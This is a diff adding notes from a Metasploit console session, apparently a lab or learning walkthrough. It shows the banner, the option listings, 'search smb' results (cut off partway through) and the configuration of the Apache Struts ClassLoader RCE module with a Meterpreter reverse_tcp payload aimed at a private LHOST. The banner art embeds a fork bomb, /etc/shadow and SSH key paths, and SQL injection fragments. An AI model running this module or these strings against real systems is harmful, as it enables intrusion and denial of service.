@@ -1,0 +1,168 @@
+| Option   | Role           |
+| -------- | -------------- |
+| `RHOSTS` | Target machine |
+| `LHOST`  | Your machine   |
+
+
+
+
+
+──(kali㉿kali)-[~]
+└─$ msfconsole
+Metasploit tip: Network adapter names can be used for IP options set LHOST 
+eth0
+                                                  
+                                              `:oDFo:`                            
+                                           ./ymM0dayMmy/.                          
+                                        -+dHJ5aGFyZGVyIQ==+-                    
+                                    `:sm⏣~~Destroy.No.Data~~s:`                
+                                 -+h2~~Maintain.No.Persistence~~h+-              
+                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
+                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
+                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
+                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
+                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
+                      :we're.all.alike'`                     The.PFYroy.No.D7:  
+                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
+                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
+                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
+                      :<script>.Ac816/                        sENbove3101.404:    
+                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
+                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
+                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
+                      :#OUTHOUSE-  -s:                       /corykennedyData:    
+                      :$nmap -oS                              SSo.6178306Ence:    
+                      :Awsm.da:                            /shMTl#beats3o.No.:    
+                      :Ring0:                             `dDestRoyREXKC3ta/M:    
+                      :23d:                               sSETEC.ASTRONOMYist:    
+                       /-                        /yo-    .ence.N:(){ :|: & };:    
+                                                 `:Shall.We.Play.A.Game?tron/    
+                                                 ```-ooy.if1ghtf0r+ehUser5`    
+                                               ..th3.H1V3.U2VjRFNN.jMh+.`          
+                                              `MjM~~WE.ARE.se~~MMjMs              
+                                               +~KANSAS.CITY's~-`                  
+                                                J~HAKCERS~./.`                    
+                                                .esc:wq!:`                        
+                                                 +++ATH`                                                               
+                                                  `                                                                    
+                                                                                                                       
+                                                                                                                       
+       =[ metasploit v6.4.116-dev                               ]                                                      
++ -- --=[ 2,623 exploits - 1,326 auxiliary - 1,710 payloads     ]                                                      
++ -- --=[ 432 post - 49 encoders - 14 nops - 10 evasion         ]                                                      
+                                                                                                                       
+Metasploit Documentation: https://docs.metasploit.com/                                                                 
+The Metasploit Framework is a Rapid7 Open Source Project                                                               
+-------------------------------------------------------------------------------------------------------------------------------------------------------------                                                                                                                       
+msf > show options
+
+Global Options:
+===============
+
+   Option             Current Setting    Description
+   ------             ---------------    -----------
+   ConsoleLogging     false              Log all console input and output
+   LogLevel           0                  Verbosity of logs (default 0, max 3)
+   MeterpreterPrompt  meterpreter        The meterpreter prompt string
+   MinimumRank        0                  The minimum rank of exploits that will run without explicit confirmation
+   Prompt             msf                The prompt string
+   PromptChar         >                  The prompt character
+   PromptTimeFormat   %Y-%m-%d %H:%M:%S  Format for timestamp escapes in prompts
+   SessionLogging     false              Log all input and output for sessions
+   SessionTlvLogging  false              Log all incoming and outgoing TLV packets
+   TimestampOutput    false              Prefix all console output with a timestamp
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+msf > search smb
+
+Matching Modules
+================
+
+   #    Name                                                                            Disclosure Date  Rank       Check  Description
+   -    ----                                                                            ---------------  ----       -----  -----------
+   0    exploit/multi/http/struts_code_exec_classloader                                 2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
+   1      \_ target: Java                                                               .                .          .      .
+   2      \_ target: Linux                                                              .                .          .      .
+   3      \_ target: Windows                                                            .                .          .      .
+   4      \_ target: Windows / Tomcat 6 & 7 and GlassFish 4 (Remote SMB Resource)       .                .          .      .
+   5    exploit/osx/browser/safari_file_policy                                          2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution
+   6      \_ target: Safari 5.1 on OS X                                                 .                .          .      .
+   7      \_ target: Safari 5.1 on OS X with Java                                       .                .          .      .
+   8    auxiliary/server/capture/smb                                                    .                normal     No     Authentication Capture: SMB
+   9    post/linux/busybox/smb_share_root                                               .                normal     No     BusyBox SMB Sharing
+   10   exploit/linux/misc/cisco_rv340_sslvpn                                           2022-02-02       good       Yes    Cisco RV340 SSL VPN Unauthenticated Remote Code Execution
+   11   auxiliary/scanner/http/citrix_dir_traversal                                     2019-12-17       normal     No     Citrix ADC (NetScaler) Directory Traversal Scanner
+   12   auxiliary/gather/crushftp_fileread_cve_2024_4040                                .                normal     Yes    CrushFTP Unauthenticated Arbitrary File Read
+   13   auxiliary/scanner/smb/impacket/dcomexec                                         2018-03-19       normal     No     DCOM Exec
+   14   auxiliary/scanner/smb/impacket/secretsdump                                      .                normal     No     DCOM Exec
+   15   auxiliary/scanner/dcerpc/dfscoerce                                              .                normal     No     DFSCoerce
+   16   auxiliary/server/relay/esc8                                                     .                normal     Yes    ESC8 Relay: SMB to HTTP(S)
+   17   exploit/windows/scada/ge_proficy_cimplicity_gefebt                              2014-01-23       excellent  Yes    GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
+   18   exploit/windows/smb/generic_smb_dll_injection                                   20
+
+   ------------------
+   ------------------------
+   ------------------------------
+   ------------------------------------
+
+     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
+   449  payload/windows/meterpreter/reverse_named_pipe                                  .                normal     No     Windows Meterpreter (Reflective Injection), Windows x86 Reverse Named Pipe (SMB) Stager
+   450  post/windows/gather/netlm_downgrade                                             .                normal     No     Windows NetLM Downgrade Attack
+   451  auxiliary/fileformat/multidrop                                                  .                normal     No     Windows SMB Multi Dropper
+   452  payload/windows/x64/custom/reverse_named_pipe                                   .                normal     No     Windows shellcode stage, Windows x64 Reverse Named Pipe (SMB) Stager
+   453  payload/windows/custom/reverse_named_pipe                                       .                normal     No     Windows shellcode stage, Windows x86 Reverse Named Pipe (SMB) Stager
+   454  exploit/multi/http/pgadmin_session_deserialization                              2024-03-04       excellent  Yes    pgAdmin Session Deserialization RCE
+
+
+Interact with a module by name or index. For example info 454, use 454 or use exploit/multi/http/pgadmin_session_deserialization                                                                                                              
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+msf > use 2
+[*] Additionally setting TARGET => Linux                                                                                                                                                                      
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp                                                                                                                                    
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+msf exploit(multi/http/struts_code_exec_classloader) > show options
+
+Module options (exploit/multi/http/struts_code_exec_classloader):
+
+   Name            Current Setting                           Required  Description
+   ----            ---------------                           --------  -----------
+   JOHNPWFILE                                                no        Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 hashes, each of which is stored in separate files. Can also
+                                                                        be a path.
+   Proxies                                                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, http, socks5h, sapni, socks4
+   RHOSTS                                                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT           8080                                      yes       The target port (TCP)
+   SMB_DELAY       10                                        yes       Time that the SMB Server will wait for the payload request
+   SRVHOST         0.0.0.0                                   yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT         445                                       yes       The local port to listen on.
+   SSL             false                                     no        Negotiate SSL/TLS for outgoing connections
+   STRUTS_VERSION  2.x                                       yes       Apache Struts Framework version (Accepted: 1.x, 2.x)
+   TARGETURI       /struts2-blank/example/HelloWorld.action  yes       The path to a struts application action
+   VHOST                                                     no        HTTP server virtual host
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.214.128  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   Linux
+
+
+
+View the full module info with the info, or info -d command.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+msf exploit(multi/http/struts_code_exec_classloader) > 
+
+
+
+
+
+
+
